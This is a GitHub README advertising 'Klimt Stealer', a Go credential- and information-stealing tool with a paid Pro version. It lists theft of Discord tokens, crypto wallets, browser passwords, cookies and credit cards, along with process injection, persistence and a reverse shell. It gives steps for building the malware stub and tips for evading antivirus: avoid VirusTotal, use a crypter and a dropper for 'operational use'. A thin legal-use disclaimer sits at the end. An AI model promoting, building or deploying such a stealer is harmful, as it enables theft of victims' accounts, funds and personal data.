**SOURCE CODE HAS BEEN RELEASED!**

**You can private message me (<a href="https://discord.com/users/900072916597735444">yahweh#7023</a>) to inquire about purchasing the Pro Version.**

[![Contributors][contributors-shield]][contributors-url]
[![Forks][forks-shield]][forks-url]
[![Stargazers][stars-shield]][stars-url]
[![Issues][issues-shield]][issues-url]
[![GNU License][license-shield]][license-url]

<br />

<div align="center">
  <a href="https://github.com/codeuk/klimt">
    <img src="https://cdn4.iconfinder.com/data/icons/internet-security-flat-2/32/Internet_Security_danger_malware_website_web_virus-512.png" alt="Logo" width="130" height="130">
  </a>

  <h3 align="center">Klimt Stealer - Free Version</h3>

  <p align="center">
The most powerful credential & information stealing tool, written in <a href="https://go.dev">GoLang</a>
    <br />
Created and maintained by <a href="https://discord.com/users/900072916597735444">yahweh#7023</a>
    <br />
    <br />
    <a href="https://github.com/codeuk/klimt#features">View Features</a>
    ·
    <a href="https://github.com/codeuk/klimt#embed-showcase">Embed Showcase</a>
    ·
    <a href="https://github.com/codeuk/klimt/issues">Request Feature</a>
  </p>
</div>
<br />

# About This Project
Klimt is an offensive security tool designed for credential stealing, system information analysis and security assessments. It features a range of options for compromising different types of systems and applications, including Discord, Various CryptoCurrency Wallets, Web Browsers, Roblox, and [many more](https://github.com/codeuk/klimt#features). Klimt also includes a persistent reverse shell option that allows users to execute commands from a remote server, along with an interactive GUI builder.

-- 2nd Note: **When using this program, do not upload the stub (build/agent.exe) to any virus scanning platforms (ex. VirusTotal) as this will only increase detections in the future.**

## Features
*Features with the 💎 emoji before them are held for the private/professional version only*

<details open>
<summary><strong>Credential Stealing</strong></summary>
<br>

- Discord Stealer: Steals authentication tokens and account information from 30+ Discord locations.
- Wallet Stealer: Steals cryptocurrency wallet files and credentials from popular wallets.
- 💎 Steam Stealer: Steals account authentication tokens from the Steam client.
- 💎 Telegram Stealer: Steals client session data from the Telegram client.
- 💎 FileZilla Stealer: Steals recent server credentials and configuration settings from the FileZilla client.
- 💎 Browser Stealer: Steals browser cookies, passwords, history, downloads and credit cards from Web Browsers.
- 💎 Roblox Stealer: Steals login credentials and authentication tokens from the Roblox game client & website.

</details>

<details open>
<summary><strong>Program Injection</strong></summary>
<br>

- Discord: Injects a custom Javascript package into the Discord process for added functionality.
- 💎 Startup: Adds Klimt to the list of startup programs to ensure persistence.
- 💎 Browsers: Injects a custom module into major web browsers for added functionality.

</details>

<details open>
<summary><strong>System Information</strong></summary>
<br>

- General: Collects general system information using the Windows registry and WMIC.
- Local Files: Scans the target machines files.
- Installed Software: Collects information on installed software.
- Network Connections: Logs network activity and connections.

</details>

<details>
<summary><strong>Misc</strong></summary>
<br>

- Reverse Shell: Optional connection to your external listener server (netcat, msf, etc.)
- Custom GUI Builder with interactive widgets (Embed color picker, tabs, etc.)
- Relatively small build size (4MB UPX'd) in comparison to other stealers (approx. 30MB+)
- FUD With Crypter (Pro version is less detectable)
- Encrypts strings stored in the config so that they aren't searchable in the binary, such as:
  - Discord Webhook URL
  - Reverse Shell Server Information

</details>

## Embed Showcase
*Embed layouts may differ depending on the stealer configuration and version, the following is a general config for the Free version.*

<img src="https://user-images.githubusercontent.com/75194878/228551296-ee1b3de5-7de2-4cb4-acef-1f33bc076242.png" alt="Overview" width=50% height=50%><img src="https://user-images.githubusercontent.com/75194878/228549045-6c3a4fac-20fc-40b8-811c-3d4722bccf49.png" alt="System" width=44% height=44%><img src="https://user-images.githubusercontent.com/75194878/228552046-478d6acb-fe4f-4f4b-9f50-7e5bbdea93a5.png" alt="System" width=50% height=50%>

## Builder Showcase
*Layout and theme of the builder may change in the future*


<img src="https://user-images.githubusercontent.com/75194878/228554304-e88ba688-a1d2-4042-bd78-e8bf8b1f224f.png" alt="Overview" width=50% height=50%><img src="https://user-images.githubusercontent.com/75194878/228554522-0a717830-1ff3-4112-b1e1-e56a5600774c.png" alt="Overview" width=50% height=50%>

## Installation

To install Klimt, make sure you have [GoLang](https://go.dev) installed and follow these steps:

1. Clone the repository using `git clone https://github.com/codeuk/klimt.git`
2. Open a terminal and navigate to the directory you installed Klimt in.
3. Install the required dependencies using `go get ./...`
4. Build the builder using `go build builder.go` or by opening the `build.bat` file if you're on Windows.

## Usage

To use the Klimt Builder, follow these steps:

1. In the Klimt directory, run `builder` or open the new `builder.exe` file to open the Klimt Stealer Builder.
2. Wait a few seconds, and when the builder GUI opens, configure it how you wish and press `Compile Stealer`.
3. If the build is successful, the executable should be in `build/agent.exe`, and can now use this stub as you wish.

The stealer build is approx. 4MB (UPX'd) and so far FUD (0 detections with the Pro Version, at least.), though I'd still recommend using a dropper when putting it to operational use.

## Disclaimer

Klimt is intended for legal and ethical use only. The developers and contributors of Klimt are not responsible for any illegal or unethical activities performed using this tool. Users of Klimt are solely responsible for their actions and are advised to use the tool for legitimate security testing purposes only. Reselling this program as a closed-source binary is a crime, please do not steal the source.

## License

Klimt is licensed under the GNU General Public License v3.0. See the LICENSE file for more information.

<img src="https://user-images.githubusercontent.com/75194878/228231029-f7ba84b1-c0cc-4472-a8dd-e09898f93912.gif" alt="Overview" width=100% height=100%>


<!-- MARKDOWN LINKS & IMAGES -->
<!-- https://www.markdownguide.org/basic-syntax/#reference-style-links -->
[contributors-shield]: https://img.shields.io/github/contributors/codeuk/klimt.svg?style=for-the-badge
[contributors-url]: https://github.com/codeuk/klimt/graphs/contributors
[license-shield]: https://img.shields.io/github/license/codeuk/klimt?style=for-the-badge
[license-url]: https://github.com/codeuk/klimt/blob/master/LICENSE.txt
[forks-shield]: https://img.shields.io/github/forks/codeuk/klimt.svg?style=for-the-badge
[forks-url]: https://github.com/codeuk/klimt/network/members
[stars-shield]: https://img.shields.io/github/stars/codeuk/klimt.svg?style=for-the-badge
[stars-url]: https://github.com/codeuk/klimt/stargazers
[issues-shield]: https://img.shields.io/github/issues/codeuk/klimt.svg?style=for-the-badge
[issues-url]: https://github.com/codeuk/klimt/issues
[license-url]: https://github.com/codeuk/klimt/blob/master/LICENSE.txt
